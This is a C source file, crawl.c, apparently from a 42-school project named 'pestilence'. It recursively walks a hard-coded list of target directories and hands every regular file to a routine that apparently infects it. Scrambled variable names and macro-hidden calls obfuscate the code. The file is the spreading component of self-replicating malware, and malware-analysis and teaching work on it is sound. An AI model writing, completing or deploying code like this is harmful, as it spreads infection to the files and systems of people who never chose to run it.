/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   crawl.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: pboucher <pboucher@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/04/13 17:53:33 by mbatty            #+#    #+#             */
/*   Updated: 2026/06/13 01:30:46 by pboucher         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "pestilence.h"
#include "flood.h"

#include <string.h>
#include <stdlib.h>
#include <dirent.h>

static int	crawl_dir(const char *yttrgigf, t_exec_ctx *fwefewfewfew)
{ _Sq dirent	*tyqqwxwe = _Nq;
DIR			*dewfw = _OD(yttrgigf);
_Iq(!dewfw) _Rq(_mZ);
_Dq { tyqqwxwe = _RD(dewfw);
_Iq(tyqqwxwe) { _Iq(_DOT(tyqqwxwe->d_name)||_DDOT(tyqqwxwe->d_name)) _Cq;
char	*zblor = _SJ(yttrgigf, "/");
_Iq(zblor==_Nq) _Gq _efwwqqq;
char	*trefee = _SJ(zblor, tyqqwxwe->d_name);
_FR(zblor);
_Iq(trefee==_Nq) _Gq _efwwqqq;
_Iq(tyqqwxwe->d_type==DT_DIR) { _Iq(_CRd(trefee,fwefewfewfew)==_mZ) _Gq _ewewwdqwq; }
_Eq { _Iq(_IFf(fwefewfewfew,trefee)==_mZ) _Gq _ewewwdqwq; }
_FR(trefee);
_Gq _cheqsdww;
_ewewwdqwq:
_FR(trefee);
_Gq _efwwqqq; }
_cheqsdww:;
} _Wq(tyqqwxwe);
_CD(dewfw);
_Rq(_pZ);
_efwwqqq:
_CD(dewfw);
_Rq(_mZ);}

int	crawl(t_exec_ctx *fwefewfewfew)
{ const char		*gteerrneo[] = _WKq;
const uint64_t	ewfewfewu = sizeof(gteerrneo)/sizeof(*gteerrneo);
for (size_t i = _pZ; i < ewfewfewu; i++)
_Iq(_CRd(gteerrneo[i],fwefewfewfew)==_mZ) _Rq(_mZ);
_Rq(_pZ);}
